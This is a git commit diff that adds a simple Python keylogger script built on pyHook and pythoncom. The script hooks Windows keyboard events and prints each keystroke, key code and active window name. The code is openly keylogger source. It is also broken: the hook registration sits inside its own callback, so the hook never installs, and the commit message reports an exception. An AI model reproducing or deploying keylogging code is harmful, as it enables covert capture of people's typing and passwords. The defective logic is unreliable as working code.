b85c28258fbf734c8c8758bc633115a19e8c7332
biga <noemail@email.no>
2019-10-23 05:04:15 +0300

    keylogger added, but exception in library

--- keylogger/keylogger_simply.py
+++ keylogger/keylogger_simply.py
@@ -1,13 +1,30 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 
+import pythoncom
 import pyHook
+
 def OnKeyboardEvent(event):
+    print ('MessageName:',event.MessageName) # описание события
+    print ('Message:',event.Message)
+    print ('Time:',event.Time) #
+    print ('Window:',event.Window)
+    print ('WindowName:',event.WindowName) # имя приложения
+    print ('Ascii:', event.Ascii, chr(event.Ascii)) # код
+    print ('Key:', event.Key) # клавиша
+    print ('KeyID:', event.KeyID) # Код клавиши
+    print ('ScanCode:', event.ScanCode)
+    print ('Extended:', event.Extended)
+    print ('Injected:', event.Injected)
+    print ('Alt', event.Alt)
+    print ('Transition', event.Transition)
+    print ('---')
 
-    if event.Ascii in range(32, 127):
-        print(chr(event.Ascii))
-        buffer += chr(event.Ascii)
-
-hm = pyHook.HookManager()
-hm.KeyDown = OnKeyboardEvent
-hm.HookKeyboard()
+    hm = pyHook.HookManager()
+    hm.KeyDown = OnKeyboardEvent
+    hm.KeyUp = OnKeyboardEvent
+    hm.HookKeyboard()
+try:
+    pythoncom.PumpMessages()
+except KeyboardInterrupt:
+    pass
